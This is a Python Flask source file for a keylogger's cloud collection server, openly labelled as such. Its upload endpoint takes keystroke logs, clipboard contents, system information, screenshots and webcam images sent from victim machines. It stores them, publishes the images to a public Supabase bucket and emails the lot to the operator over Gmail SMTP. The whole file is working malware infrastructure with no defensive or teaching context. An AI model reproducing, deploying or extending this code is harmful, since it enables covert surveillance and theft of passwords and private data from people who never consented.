from flask import Flask, request
import os
from datetime import datetime
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from supabase import create_client, Client
import threading

app = Flask(__name__)
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

EMAIL = os.getenv("EMAIL")
PASSWORD = os.getenv("PASSWORD")

# Supabase Configuration
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_KEY = os.getenv("SUPABASE_KEY")
BUCKET_NAME = "key_logger_images"

# Initialize Supabase client
supabase: Client = None
if SUPABASE_URL and SUPABASE_KEY:
    try:
        supabase = create_client(SUPABASE_URL, SUPABASE_KEY)
        print("✅ Supabase connected successfully")
    except Exception as e:
        print(f"❌ Supabase connection failed: {e}")
else:
    print("⚠️ Supabase credentials missing")

@app.route("/")
def home():
    return "✅ Keylogger Cloud Server Running"

@app.route("/health")
def health():
    """Health check endpoint to verify configuration"""
    status = {
        "server": "running",
        "email_configured": bool(EMAIL and PASSWORD),
        "supabase_url_set": bool(SUPABASE_URL),
        "supabase_key_set": bool(SUPABASE_KEY),
        "supabase_connected": bool(supabase),
        "bucket_name": BUCKET_NAME
    }
    return status, 200

def upload_to_supabase(file_path, file_name):
    """Upload file to Supabase Storage and return public URL"""
    if not supabase:
        print("⚠️ Supabase client not initialized - skipping upload")
        return None
        
    try:
        print(f"📤 Attempting to upload {file_name} to Supabase...")
        with open(file_path, "rb") as f:
            file_data = f.read()
        
        print(f"📦 File size: {len(file_data)} bytes")
        
        # Upload to Supabase Storage
        response = supabase.storage.from_(BUCKET_NAME).upload(
            file_name, 
            file_data,
            {"content-type": "image/png"}
        )
        
        print(f"📡 Upload response: {response}")
        
        # Get public URL
        public_url = supabase.storage.from_(BUCKET_NAME).get_public_url(file_name)
        print(f"✅ Uploaded to Supabase: {file_name}")
        print(f"🔗 Public URL: {public_url}")
        return public_url
    except Exception as e:
        print(f"❌ Supabase upload failed for {file_name}")
        print(f"❌ Error type: {type(e).__name__}")
        print(f"❌ Error message: {str(e)}")
        import traceback
        traceback.print_exc()
        return None

@app.route("/upload_log", methods=["POST"])
def upload_log():
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    data_dict = {}
    saved_files = {}
    supabase_urls = {}

    # Save text fields
    for field in ["system_info", "clipboard", "keylog"]:
        data = request.form.get(field)
        if data:
            file_path = f"{UPLOAD_DIR}/{field}_{timestamp}.txt"
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(data)
            data_dict[field] = data

    # Save uploaded files locally and to Supabase
    for field in ["screenshot", "webcam"]:
        file = request.files.get(field)
        if file:
            file_name = f"{field}_{timestamp}.png"
            file_path = f"{UPLOAD_DIR}/{file_name}"
            file.save(file_path)
            saved_files[field] = file_path
            
            # Upload to Supabase if available
            if supabase:
                public_url = upload_to_supabase(file_path, file_name)
                if public_url:
                    supabase_urls[field] = public_url

    
    # Send email in background thread (non-blocking)
    def send_email_async():
        if EMAIL and PASSWORD:
            try:
                msg = MIMEMultipart()
                msg["Subject"] = "📩 Keylogger Alert Received"
                msg["From"] = EMAIL
                msg["To"] = EMAIL

                # Build email body with Supabase URLs
                body = f"""🖥️ SYSTEM INFO:
{data_dict.get('system_info', '')}

📋 CLIPBOARD:
{data_dict.get('clipboard', '')}

⌨️ KEYLOGS:
{data_dict.get('keylog', '')}

📸 IMAGES (Supabase Storage):"""
                
                if supabase_urls:
                    for label, url in supabase_urls.items():
                        body += f"\n{label.upper()}: {url}"
                else:
                    body += "\n(No images uploaded to Supabase)"
                    
                msg.attach(MIMEText(body, "plain"))

                # Attach images to email
                for label, path in saved_files.items():
                    with open(path, "rb") as f:
                        img = MIMEImage(f.read())
                        img.add_header("Content-Disposition", "attachment", filename=os.path.basename(path))
                        msg.attach(img)

                with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
                    smtp.starttls()
                    smtp.login(EMAIL, PASSWORD)
                    smtp.send_message(msg)

                print("✅ Email alert sent.")
            except Exception as e:
                print("❌ Email sending failed:", e)
        else:
            print("⚠️ Email or password environment variables missing.")
    
    # Start email sending in background
    if EMAIL and PASSWORD:
        threading.Thread(target=send_email_async, daemon=True).start()
        email_status = "Email queued (sending in background)"
    else:
        email_status = "Email skipped (credentials missing)"

    return f"✅ SERVER UPDATED! Log received. Supabase: {len(supabase_urls)} images uploaded. {email_status}", 200

# ✅ REQUIRED for Render to work:
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # use PORT from Render or default to 10000
    app.run(host="0.0.0.0", port=port)
